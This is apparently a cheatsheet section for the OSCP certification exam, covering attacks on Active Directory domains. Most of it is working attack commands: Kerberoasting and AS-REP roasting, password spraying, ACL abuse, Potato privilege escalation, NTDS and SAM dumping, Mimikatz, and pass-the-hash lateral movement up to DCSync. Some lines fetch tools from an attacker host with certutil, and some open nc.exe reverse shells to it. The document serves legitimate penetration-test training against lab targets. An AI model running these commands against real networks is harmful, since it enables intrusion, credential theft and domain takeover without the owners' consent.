# 05 · Active Directory

> Part of the **OSCP/OSCP+ cheatsheet** — [← back to index](README.md)

---

## ACTIVE DIRECTORY (the 40-point set — prioritize this)

> You start the AD set WITH a low-priv domain credential ("assumed breach"). Goal: pivot host→host→DC.
> Reminder: **Responder poisoning is BANNED on the exam.** **Metasploit can't be used for pivoting** (AD spans 3 hosts).

### Enumerate the domain (with your given creds)
```bash
# nxc / NetExec is your swiss army knife
nxc smb $IP -u user -p pass --shares --users --groups --pass-pol
nxc smb $IP -u user -p pass --rid-brute            # enumerate all users
nxc ldap $IP -u user -p pass --bloodhound -c all --dns-server $IP
# BloodHound collection
bloodhound-python -u user -p pass -d target.htb -ns $IP -c all --zip
# or on Windows target: .\SharpHound.exe -c All
# LDAP dumps
ldapdomaindump -u 'target\user' -p pass $IP
# PowerView (on a Windows shell)
. .\PowerView.ps1
Get-NetUser | select samaccountname,description
Get-NetGroup "Domain Admins" -MemberOf
Find-LocalAdminAccess        # where can current user RDP/admin
Get-NetComputer -FullData
```
**Always read user `description` fields and SMB shares — creds hide there.**

### Get a first credential / hash
```bash
# AS-REP roast (users with "do not require preauth") - NO creds needed if you have usernames
impacket-GetNPUsers target.htb/ -dc-ip $IP -usersfile users.txt -no-pass -format hashcat
nxc ldap $IP -u user -p pass --asreproast asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# Kerberoast (any valid domain cred -> SPN accounts' TGS hashes)
impacket-GetUserSPNs target.htb/user:pass -dc-ip $IP -request -outputfile kerb.txt
nxc ldap $IP -u user -p pass --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt

# Password spray (careful with lockout policy from --pass-pol)
nxc smb $IP -u users.txt -p 'Season2025!' --continue-on-success
kerbrute passwordspray -d target.htb users.txt 'Password1'
```

### ACL / object abuse (BloodHound shows the path)
```powershell
# ForceChangePassword on a user (Garfield pattern)
net rpc password "victim" "NewPass123!" -U "target.htb"/"me"%"mypass" -S $IP
# or PowerView:
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
# GenericAll / GenericWrite on user -> set SPN then kerberoast (targeted), or shadow creds
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/x'}   # then kerberoast
# GenericAll on group -> add yourself
net group "Target Group" me /add /domain
# GenericAll on computer / shadow credentials (modern):
certipy shadow auto -u me@target.htb -p pass -account VICTIM$ -dc-ip $IP
```

### Local -> SYSTEM on a domain-joined host (the bridge to cred dumping)
> `secretsdump --sam --lsa`, mimikatz, and LSASS dumps all need **local admin / SYSTEM** on the
> box. When a foothold lands you as a service account (IIS app pool, MSSQL svc, custom service)
> or a plain low-priv domain user, this is the step that gets you there. First command, always:
```
whoami /priv
```
Output drives the technique. **State (Enabled/Disabled) doesn't matter — only whether the privilege is in the token at all:**

| Privilege                  | Technique                                      |
| -------------------------- | ---------------------------------------------- |
| `SeImpersonatePrivilege`   | Potato family (below) — most common on svc accts |
| `SeBackupPrivilege`        | Offline SAM/SYSTEM/NTDS dump (below)           |
| `SeRestorePrivilege`       | Arbitrary file write -> overwrite a SYSTEM bin |
| `SeTakeOwnershipPrivilege` | ACL games -> own + overwrite a SYSTEM file     |
| `SeDebugPrivilege`         | Token impersonation / procdump LSASS           |
| `SeLoadDriverPrivilege`    | Load a malicious driver                        |

**SeImpersonate -> SYSTEM (Potato family).** Abuses a DCOM/RPC auth callback from a SYSTEM COM server, then impersonates the token. Pick by OS version:

| Windows version                             | Tool                                     |
| ------------------------------------------- | ---------------------------------------- |
| 2008/2008R2/2012/2012R2/2016 (pre-May 2020) | **JuicyPotato**                          |
| 2019 / 2022 / Win10 1809+                   | **PrintSpoofer** or **GodPotato**        |
| Modern, Spooler disabled                    | **RoguePotato** (external OXID resolver) |
```
:: Stage tools to a writable dir
certutil -urlcache -split -f http://%TUN0%/Juicy.exe Juicy.exe
certutil -urlcache -split -f http://%TUN0%/nc.exe nc.exe
:: Dry-run: confirm the CLSID maps to a SYSTEM-owned COM server (should print SYSTEM)
.\Juicy.exe -z -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
:: Fire
.\Juicy.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" ^
  -p C:\Windows\System32\cmd.exe ^
  -a "/c C:\Users\Public\nc.exe -e cmd.exe %TUN0% 1339" -t *
:: Modern hosts (2019/2022):
PrintSpoofer.exe -i -c "C:\Users\Public\nc.exe -e cmd.exe %TUN0% 1339"
GodPotato -cmd "C:\Users\Public\nc.exe -e cmd.exe %TUN0% 1339"
```
> **Quoting gotchas (the time-wasters):** `-a` is a SINGLE arg string — quote the whole thing or JuicyPotato chokes on the first inner `-`. Spawned proc inherits a cwd you don't control (usually system32) -> use **absolute paths** for nc.exe and any file. `-t *` tries both token APIs; leave it.
> **CLSID ref:** BITS `{4991d34b-80a1-4291-83b6-3328366b9097}` works on 2008/2012; many fail on 2016 — grab one from the ohpe Server 2016 list. Always `-z` test first. Token user != SYSTEM in `-z` -> wrong CLSID for this OS, move on. Callback but no shell -> cwd/abs-path issue or nc.exe not staged.

**SeBackupPrivilege -> offline NTDS/SAM dump.** On a DC this *is* domain compromise — no DCSync rights needed, you read NTDS.dit directly via the backup right:
```
:: SAM/SYSTEM (member server / workstation)
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
:: then offline:  impacket-secretsdump -sam sam.save -system system.save LOCAL
:: NTDS.dit on a DC (file is locked -> snapshot it)
diskshadow /s C:\Temp\dsh.txt          :: script: set context persistent / add volume c: / create / expose
robocopy /b X:\Windows\NTDS C:\Temp\ ntds.dit
reg save HKLM\SYSTEM C:\Temp\system.save
:: exfil both, then offline:
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
```
> Robocopy `/b` = backup mode, the flag that consumes SeBackupPrivilege. If `diskshadow` scripting is fiddly, `wbadmin` or the `SeBackupPrivilege.dll` + `SeRestoreAbusePoC` route also works. Offline `secretsdump -ntds` parsing avoids touching the DC's LSASS at all.

### Credential dumping & lateral movement
```bash
# Dump secrets (needs admin on target)
impacket-secretsdump 'target.htb/user:pass@'$IP
impacket-secretsdump -hashes :NThash 'target.htb/user@'$IP
nxc smb $IP -u user -p pass --sam --lsa
# Pass-the-Hash / Pass-the-Password lateral exec
nxc smb <subnet> -u user -H NThash                  # spray hash across hosts
impacket-psexec target.htb/user@$IP -hashes :NThash
impacket-wmiexec target.htb/user@$IP -hashes :NThash     # quieter than psexec
impacket-smbexec / impacket-atexec / impacket-dcomexec
evil-winrm -i $IP -u user -H NThash                 # if WinRM open
# Overpass-the-hash / Pass-the-Ticket
impacket-getTGT target.htb/user -hashes :NThash ; export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass target.htb/user@dc01.target.htb
```

### To Domain Admin / DC
```bash
# DCSync (needs Replication rights / DA-equiv ACL)
impacket-secretsdump -just-dc target.htb/user:pass@$IP
nxc smb $IP -u user -p pass -M ntdsutil           # if admin
# Pass the krbtgt hash if dumped = golden ticket (usually overkill for exam; prefer DCSync->admin)
# Once you have Administrator/DA NT hash:
impacket-psexec -hashes :<admin_nthash> administrator@<dc_ip>
```

### Useful AD glue
- Time sync if Kerberos errors (`KRB_AP_ERR_SKEW`): `sudo ntpdate $DC` or `sudo timedatectl set-ntp off; sudo rdate -n $DC`.
- Add DC + domain to `/etc/hosts`; use FQDN for Kerberos.
- `--local-auth` flag on nxc for local (non-domain) accounts.
- MSSQL linked-server double-hop (POO pattern): `EXEC ('xp_cmdshell ...') AT [LINKED]`.

### rpcclient / kerbrute enumeration (no creds)
```bash
rpcclient -U "" -N $IP                     # null session
rpcclient -U "target.htb\guest%" $IP       # guest
# inside rpcclient: enumdomusers ; queryuser 0x<rid> ; enumdomgroups ; querygroupmem 0x<rid>
#   getdompwinfo (lockout policy!) ; lsaenumsid ; lookupnames administrator ; netshareenum
kerbrute userenum -d target.htb --dc $IP users.txt   # valid usernames, no creds needed
# parse BloodHound user JSON for descriptions (creds hide there):
jq '.data[]|select(.Properties.description!=null)|{n:.Properties.name,d:.Properties.description}' users.json
```

### Mimikatz / credential extraction (need admin/SYSTEM)
```
privilege::debug
sekurlsa::logonpasswords        # plaintext + NTLM from LSASS
sekurlsa::ekeys                 # kerberos keys -> PtT / overpass-the-hash
lsadump::sam                    # local SAM   |   lsadump::cache (cached domain creds)
lsadump::dcsync /user:target\krbtgt        # DCSync (needs replication rights)
vault::cred  /  sekurlsa::dpapi            # stored / DPAPI creds
# Offline (SeDebug): procdump -accepteula -ma lsass.exe l.dmp -> pypykatz lsa minidump l.dmp
```

### Delegation (only if BloodHound flags it — usually beyond core OSCP scope)
```bash
# Constrained (TRUSTED_TO_AUTH_FOR_DELEGATION): impersonate via S4U
impacket-getST -spn cifs/target -impersonate administrator 'dom/svc:pass'
# RBCD (you have GenericWrite on a computer object): set msDS-AllowedToActOnBehalfOfOtherIdentity
#   then impacket-getST -spn ... -impersonate administrator. Tools: rubeus s4u.
# Unconstrained: coerce a DC auth (printerbug/PetitPotam) then grab its TGT. Note scope before sinking time.
```

### Find creds across the domain (after a foothold)
```bash
Snaffler.exe -s -o snaffler.log              # hunt shares for creds/keys/configs (Windows)
nxc smb <subnet> -u u -p p -M spider_plus    # spider readable shares
manspider <subnet> -u u -p p -c password     # grep file CONTENTS across all shares
# GPP cached creds in SYSVOL (Groups.xml etc.) -> decrypt the AES blob:
nxc smb $IP -u u -p p -M gpp_password ; gpp-decrypt <cpassword>
# LAPS local-admin passwords (if readable):
nxc ldap $IP -u u -p p -M laps
```

### OSCP-scope note
Focus drills: AS-REP roast, Kerberoast, password spray, ACL abuse (ForceChangePassword / GenericAll / GenericWrite), local-priv->SYSTEM via SeImpersonate (Potato) and SeBackupPrivilege NTDS dump, PtH/PtT lateral movement, secretsdump, DCSync. **Above exam scope** (skip unless needed): RODC golden tickets, KeyList attacks, ESC16/advanced ADCS, unconstrained-delegation printerbug chains.

---
